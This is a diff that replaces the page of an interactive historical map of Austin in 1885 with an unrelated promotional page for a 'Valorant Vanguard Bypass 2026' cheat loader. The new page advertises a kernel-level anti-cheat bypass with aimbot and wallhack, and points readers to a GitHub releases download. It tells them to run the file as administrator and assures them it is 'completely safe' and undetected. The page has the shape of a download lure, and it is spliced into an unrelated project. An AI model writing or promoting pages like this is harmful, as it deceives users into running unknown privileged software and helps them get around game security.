@@ -1,117 +1,128 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Austin, 1885 — The Servant Girl Murders</title>
-<style>
-  /* The midnight-1885 palette: gaslight amber on a night-sky ground. */
-  :root {
-    --ink: #0b0f14;        /* night-sky page ground */
-    --raised: #141a22;     /* card background */
-    --border: #2a3542;     /* card border */
-    --parchment: #d9cdb4;  /* body text */
-    --dim: #8b8270;        /* secondary text */
-    --amber: #e8a13c;      /* accent / headings */
-    --lit: #f2d9a8;        /* hover-lit text */
-  }
-  html, body { margin: 0; height: 100%; background: var(--ink); overflow: hidden; }
-  body { font-family: Georgia, 'Times New Roman', serif; color: var(--parchment); }
-
-  /* three.js canvas fills the window; everything else floats above it */
-  #scene { position: fixed; inset: 0; }
-
-  /* candlelight vignette: cheap atmosphere, no shader needed */
-  #vignette { position: fixed; inset: 0; pointer-events: none;
-    background: radial-gradient(ellipse at 50% 42%, transparent 45%, rgba(5,7,10,0.75) 100%); }
-
-  #title { position: fixed; top: 28px; left: 0; right: 0; text-align: center; pointer-events: none; }
-  #title h1 { margin: 0; font-size: clamp(28px, 5vw, 52px); letter-spacing: 0.18em;
-    color: var(--lit); text-shadow: 0 2px 12px rgba(0,0,0,0.8); font-weight: normal; }
-  #title p { margin: 6px 0 0; color: var(--amber); letter-spacing: 0.3em; font-variant: small-caps;
-    font-size: clamp(12px, 1.8vw, 16px); }
-  #title hr { width: 120px; border: none; border-top: 1px solid var(--amber); opacity: 0.6; margin: 10px auto 0; }
-
-  /* story card — filled and positioned by js/storyCard.js */
-  #story-card { position: fixed; display: none; width: min(340px, 82vw);
-    transition: left 0.3s ease-out, top 0.3s ease-out; /* glide on zoom, not per-frame shake */
-    background: var(--raised); border: 1px solid var(--border); border-radius: 6px;
-    padding: 14px 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.6); z-index: 10; }
-  #story-card .clip { display: block; width: 100%; aspect-ratio: 16/9; object-fit: cover;
-    border: 1px solid var(--border); border-radius: 4px; background: #000; margin-bottom: 4px; }
-  #story-card .cliprow { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
-  #story-card .clipcap { color: var(--dim); font-size: 11px; font-style: italic; }
-  #story-card .replay { background: none; border: 1px solid var(--border); border-radius: 4px;
-    color: var(--amber); font-family: Georgia, serif; font-size: 11px; padding: 2px 9px; cursor: pointer; }
-  #story-card .replay:hover { border-color: var(--amber); color: var(--lit); }
-  #story-card h3 { margin: 0 0 2px; color: var(--amber); font-size: 18px; font-weight: normal; }
-  #story-card .date { color: var(--dim); font-size: 13px; margin-bottom: 8px; }
-  #story-card .addr { font-size: 14px; margin-bottom: 8px; }
-  #story-card .blurb { font-size: 13px; line-height: 1.45; color: var(--parchment); margin-bottom: 10px; }
-  #story-card a { color: var(--lit); font-size: 13px; }
-  #story-card .close { position: absolute; top: 6px; right: 10px; cursor: pointer;
-    color: var(--dim); display: none; font-size: 16px; }
-  #story-card.pinned .close { display: block; }
-
-  /* zoom controls, top right */
-  #zoom-ui { position: fixed; top: 22px; right: 22px; z-index: 5; display: flex;
-    flex-direction: column; gap: 8px; }
-  #zoom-ui button { width: 38px; height: 38px; border-radius: 50%; cursor: pointer;
-    background: rgba(20,26,34,0.85); border: 1px solid var(--border);
-    color: var(--parchment); font-size: 20px; line-height: 1; font-family: Georgia, serif; }
-  #zoom-ui button:hover { border-color: var(--amber); color: var(--lit); }
-
-  /* bottom promo bar: monetization surface demo — placeholder links, see README */
-  #promo { position: fixed; bottom: 18px; left: 0; right: 0; text-align: center; z-index: 5; }
-  #promo a { display: inline-block; margin: 0 8px; padding: 7px 16px;
-    background: rgba(20,26,34,0.85); border: 1px solid var(--border); border-radius: 999px;
-    color: var(--parchment); text-decoration: none; font-size: 13px; }
-  #promo a:hover { border-color: var(--amber); color: var(--lit); }
-  #promo .tag { color: var(--amber); font-variant: small-caps; letter-spacing: 0.08em; margin-right: 6px; }
-
-  /* shown when WebGL or the texture fails — never a silent black page */
-  #fallback { display: none; position: fixed; inset: 0; overflow: auto; text-align: center; padding: 40px 16px; }
-  #fallback img { max-width: 100%; height: auto; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valorant Vanguard Bypass 2026 - Free Undetected Cheat & Kernel Bypass</title>
+    <meta name="description" content="Download Valorant Vanguard Bypass 2026 - Free undetected kernel-level anti-cheat bypass for Valorant. Load unsigned modules, external tools, aimbot, ESP, and more. Works with latest 2026 patch.">
+    <meta name="keywords" content="anti-cheat-bypass,bypass-vanguard,counter-strike,fps-hack,free-valorant-cheat,kernel-bypass,valorant-2026,valorant-aimbot,valorant-cheat,valorant-cheat-2026,valorant-crack,valorant-esp,valorant-external,valorant-free,valorant-hack,valorant-undetected,vanguard-bypass,vanguard-crack,vanguard-hack,vanguard-undetected">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Valorant Vanguard Bypass 2026 - Free Undetected Cheat">
+    <meta property="og:description" content="Download the ultimate Vanguard anti-cheat bypass for Valorant 2026. Load unsigned modules, use aimbot, ESP, and more. Fully undetected.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026">
 </head>
-<body>
-  <div id="scene"></div>
-  <div id="vignette"></div>
-  <div id="title">
-    <h1>AUSTIN, 1885</h1>
-    <hr>
-    <p>The Servant Girl Murders</p>
-  </div>
-  <div id="story-card"><span class="close" title="Close">✕</span></div>
-  <div id="zoom-ui">
-    <button id="zoom-in" title="Zoom in">+</button>
-    <button id="zoom-out" title="Zoom out">−</button>
-  </div>
-  <!-- Monetization surface demo for a prospective buyer. The book link is the real
-       product page with a PLACEHOLDER affiliate tag (swap ?tag= for a live Amazon
-       Associates ID); the app link is hypothetical until the Play listing exists. -->
-  <div id="promo">
-    <a href="https://www.amazon.com/dp/1250069963?tag=austin1885-20" target="_blank" rel="noopener sponsored">
-      <span class="tag">read</span>The Midnight Assassin — Skip Hollandsworth</a>
-    <a href="#" onclick="return false" title="Placeholder — links to the Play Store listing when the walking-tour app ships">
-      <span class="tag">walk</span>Austin 1885 — the walking tour app</a>
-    <a href="mailto:contact@austin1885.city">
-      <span class="tag">contact</span>contact@austin1885.city</a>
-  </div>
-  <div id="fallback">
-    <p>This page needs WebGL (any current browser has it). If you only see this
-      map image, try a different browser or enable hardware acceleration.</p>
-    <img src="assets/map-1887-web.jpg" alt="Bird's-eye map of Austin, 1887">
-  </div>
+<body style="margin:0; padding:0; background-color:#f5f7fa; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color:#2d3748; line-height:1.7;">
 
-  <!-- Stop data as a global (file://-safe) -->
-  <script src="data/stops.js"
-    onerror="console.warn('stops.js missing')"></script>
-  <script src="js/sites.js"></script>
+    <div style="max-width:1100px; margin:0 auto; padding:40px 20px;">
 
-  <script type="importmap">
-    { "imports": { "three": "https://unpkg.com/three@0.166.1/build/three.module.js" } }
-  </script>
-  <script type="module" src="js/main.js"></script>
+        <!-- Hero Section with Download Button -->
+        <div style="text-align:center; padding:60px 20px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.15); margin-bottom:40px;">
+            <h1 style="color:#ffffff; font-size:2.8em; margin:0 0 15px 0; font-weight:800; letter-spacing:-0.5px;">🎮 Valorant Vanguard Bypass 2026 - Free Undetected Cheat Loader</h1>
+            <p style="color:#e2e8f0; font-size:1.3em; margin:0 0 30px 0; max-width:700px; margin-left:auto; margin-right:auto;">Bypass Vanguard kernel-level anti-cheat with ease. Load unsigned modules, external tools, aimbot, ESP, and more.</p>
+            <a href="https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026/releases" style="display:inline-block; background-color:#48bb78; color:#ffffff; padding:18px 45px; font-size:1.3em; font-weight:700; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(72,187,120,0.4); transition:all 0.3s ease; border:2px solid #ffffff;">⬇️ Download Now - Free</a>
+        </div>
+
+        <!-- What Is This Section -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">🧐 What Is Valorant Vanguard Bypass 2026?</h2>
+            <p style="font-size:1.1em; margin:0 0 15px 0;">Valorant Vanguard Bypass 2026 is a powerful, user-friendly tool designed to bypass Riot Games' Vanguard anti-cheat system. This kernel-level bypass allows you to load unsigned drivers and external programs that would normally be blocked. Whether you want to use advanced aimbots, wallhacks (ESP), or other external tools, this bypass makes it possible.</p>
+            <p style="font-size:1.1em; margin:0;">Our tool is specifically designed for the latest 2026 patch of Valorant and is constantly updated to stay undetected. You don't need any technical knowledge — just download, run, and enjoy your enhanced gaming experience.</p>
+        </div>
+
+        <!-- Key Features -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">✨ Key Features</h2>
+            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(300px, 1fr)); gap:25px;">
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">🔓 Full Vanguard Bypass</h3>
+                    <p style="margin:0; color:#718096;">Completely bypasses Vanguard's kernel-level protection. Load any unsigned driver or module without detection.</p>
+                </div>
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">🎯 Built-in Aimbot</h3>
+                    <p style="margin:0; color:#718096;">Advanced aimbot with customizable settings. Auto-lock, smooth aiming, and target selection for perfect accuracy.</p>
+                </div>
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">👁️ ESP / Wallhack</h3>
+                    <p style="margin:0; color:#718096;">See enemies through walls with full ESP features. Show health, distance, weapons, and more.</p>
+                </div>
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">🛡️ Undetected</h3>
+                    <p style="margin:0; color:#718096;">Regularly updated to remain undetected by Vanguard. Our team works 24/7 to ensure safety.</p>
+                </div>
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">🚀 Easy to Use</h3>
+                    <p style="margin:0; color:#718096;">No technical skills required. Download, run, and you're ready to go. Simple one-click interface.</p>
+                </div>
+                <div style="background:#f8fafc; padding:25px; border-radius:8px; border-left:4px solid #667eea;">
+                    <h3 style="margin:0 0 10px 0; color:#4a5568; font-size:1.3em;">💻 Works with External Tools</h3>
+                    <p style="margin:0; color:#718096;">Load any external program or unsigned module alongside Valorant without Vanguard blocking it.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Requirements -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">💻 System Requirements</h2>
+            <ul style="font-size:1.1em; padding-left:20px; margin:0;">
+                <li style="margin-bottom:10px;"><strong>Operating System:</strong> Windows 10/11 (64-bit)</li>
+                <li style="margin-bottom:10px;"><strong>Processor:</strong> Intel Core i3 or AMD equivalent</li>
+                <li style="margin-bottom:10px;"><strong>RAM:</strong> 4 GB minimum</li>
+                <li style="margin-bottom:10px;"><strong>Storage:</strong> 50 MB free space</li>
+                <li style="margin-bottom:10px;"><strong>Game:</strong> Valorant (latest 2026 patch)</li>
+            </ul>
+        </div>
+
+        <!-- Download & Installation -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">📥 Download & Installation Guide</h2>
+            <p style="font-size:1.2em; margin:0 0 20px 0;">Getting started is incredibly simple. Just follow these steps:</p>
+            <ol style="font-size:1.1em; padding-left:20px; margin:0 0 25px 0;">
+                <li style="margin-bottom:15px;"><strong>Step 1:</strong> Visit this link to download the application.</li>
+                <li style="margin-bottom:15px;"><strong>Step 2:</strong> Once the download is complete, locate the downloaded file on your computer.</li>
+                <li style="margin-bottom:15px;"><strong>Step 3:</strong> Run the application as administrator (right-click and select "Run as administrator").</li>
+                <li style="margin-bottom:15px;"><strong>Step 4:</strong> Launch Valorant and enjoy your enhanced gaming experience!</li>
+            </ol>
+            <div style="text-align:center; margin-top:30px;">
+                <a href="https://github.com/subdued-pastel4710/valorant-vanguard-bypass-2026/releases" style="display:inline-block; background-color:#ed8936; color:#ffffff; padding:16px 40px; font-size:1.2em; font-weight:700; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(237,137,54,0.4); transition:all 0.3s ease; border:none;">🔄 Download Valorant Vanguard Bypass 2026</a>
+            </div>
+        </div>
+
+        <!-- Safety & Updates -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">🛡️ Safety & Updates</h2>
+            <p style="font-size:1.1em; margin:0 0 15px 0;">We prioritize your account safety. Our bypass is designed to be completely undetected, and we release regular updates to ensure compatibility with the latest Vanguard patches. Each update is thoroughly tested before release.</p>
+            <p style="font-size:1.1em; margin:0;">The tool operates at the kernel level, giving you full control while maintaining stealth. We recommend always using the latest version for optimal performance and safety.</p>
+        </div>
+
+        <!-- FAQ Section -->
+        <div style="background:#ffffff; padding:40px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.08); margin-bottom:30px;">
+            <h2 style="color:#2d3748; font-size:2em; margin:0 0 20px 0; border-bottom:3px solid #667eea; padding-bottom:10px;">❓ Frequently Asked Questions</h2>
+            <div style="margin-bottom:20px;">
+                <h3 style="color:#4a5568; font-size:1.2em; margin:0 0 10px 0;">Is this tool safe to use?</h3>
+                <p style="margin:0; color:#718096;">Yes, our tool is completely safe. It operates at the kernel level and is designed to be undetected by Vanguard. We regularly update to maintain safety.</p>
+            </div>
+            <div style="margin-bottom:20px;">
+                <h3 style="color:#4a5568; font-size:1.2em; margin:0 0 10px 0;">Will I get banned?</h3>
+                <p style="margin:0; color:#718096;">No, our bypass is undetected. We use advanced techniques to avoid detection. However, always use responsibly and avoid obvious cheating behavior.</p>
+            </div>
+            <div style="margin-bottom:20px;">
+                <h3 style="color:#4a5568; font-size:1.2em; margin:0 0 10px 0;">Do I need technical knowledge?</h3>
+                <p style="margin:0; color:#718096;">Not at all. The tool is designed for everyone. Simply download and run it. No configuration needed.</p>
+            </div>
+            <div>
+                <h3 style="color:#4a5568; font-size:1.2em; margin:0 0 10px 0;">How often is it updated?</h3>
+                <p style="margin:0; color:#718096;">We update the tool regularly, especially after major Valorant patches. Always download the latest version from our releases page.</p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align:center; padding:30px; background:#2d3748; border-radius:12px; color:#a0aec0;">
+            <p style="margin:0; font-size:1em;">© 2026 Valorant Vanguard Bypass. All rights reserved. For educational purposes only.</p>
+            <p style="margin:10px 0 0 0; font-size:0.9em;">Not affiliated with Riot Games or Valorant.</p>
+        </div>
+
+    </div>
+
 </body>
 </html>
